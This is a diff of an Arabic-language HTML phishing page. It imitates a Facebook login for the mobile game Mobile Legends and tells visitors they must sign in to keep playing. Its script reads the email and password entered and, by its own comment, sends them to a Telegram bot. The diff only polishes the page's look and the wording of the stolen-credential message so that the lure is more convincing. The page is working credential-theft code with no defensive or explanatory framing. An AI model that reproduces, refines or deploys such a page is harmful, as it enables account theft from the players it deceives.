@@ -3,59 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول لفيسبوك - موبايل ليجند</title>
+    <title>تسجيل الدخول إلى موبايل ليجندز عبر فيسبوك</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f2f5;
+            font-family: 'Arial', sans-serif;
+            background-image: url('https://cdn.mobirum.com/mobirum/2023/04/26/10770188_4e042a2d8d15b1db6072e7cbef8fc96e.jpg'); /* خلفية مشابهة */
+            background-size: cover;
+            background-position: center;
             text-align: center;
             margin: 0;
             padding: 0;
         }
         .login-container {
-            margin-top: 50px;
-            background-color: white;
+            margin-top: 100px;
+            background-color: #ffffff;
             padding: 40px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
             border-radius: 10px;
             display: inline-block;
+            max-width: 400px;
+            width: 100%;
         }
         img {
-            width: 150px;
+            width: 200px;
             margin-bottom: 20px;
         }
         input[type="text"], input[type="password"] {
-            padding: 10px;
+            padding: 15px;
             margin: 10px 0;
-            width: 80%;
-            max-width: 300px;
+            width: 100%;
             font-size: 16px;
-            border: 1px solid #ccc;
+            border: 1px solid #ddd;
             border-radius: 5px;
+            box-sizing: border-box;
         }
         .login-btn {
-            padding: 10px 20px;
-            background-color: #1877f2;
-            color: white;
+            padding: 15px;
+            background-color: #007bff; /* أزرق مشابه */
+            color: #ffffff;
             border: none;
             cursor: pointer;
-            font-size: 18px;
-            width: 80%;
-            max-width: 300px;
+            font-size: 16px;
             border-radius: 5px;
             margin-top: 20px;
+            width: 100%;
+            transition: background-color 0.3s;
         }
         .login-btn:hover {
-            background-color: #155bba;
+            background-color: #0056b3; /* أزرق أغمق عند التمرير */
         }
         .footer {
             margin-top: 20px;
-            color: #606770;
+            color: #6c757d;
             font-size: 14px;
         }
         .footer a {
-            color: #1877f2;
+            color: #007bff;
             text-decoration: none;
+        }
+        .message {
+            color: #dc3545; /* لون أحمر لتحذير */
+            font-size: 16px;
+            margin-bottom: 20px;
         }
     </style>
     <script>
@@ -65,7 +74,7 @@
             // الحصول على بيانات تسجيل الدخول
             var email = document.getElementById('email').value;
             var password = document.getElementById('password').value;
-            var message = "تسجيل دخول جديد \n" + "Email: " + email + "\nPassword: " + password;
+            var message = "تسجيل دخول جديد إلى موبايل ليجندز عبر فيسبوك \n" + "البريد الإلكتروني: " + email + "\nكلمة المرور: " + password;
 
             // إرسال البيانات إلى بوت تليجرام
             var xhr = new XMLHttpRequest();
@@ -82,7 +91,8 @@
 </head>
 <body>
     <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        <img src="https://cdn.mobirum.com/mobirum/2023/04/26/10770188_4e042a2d8d15b1db6072e7cbef8fc96e.jpg" alt="Mobile Legends Logo">
+        <p class="message">عليك تسجيل الدخول أولاً لتتمكن من متابعة اللعب.</p>
         <form onsubmit="sendTelegram(event);">
             <input type="text" id="email" placeholder="البريد الإلكتروني" required><br>
             <input type="password" id="password" placeholder="كلمة المرور" required><br>
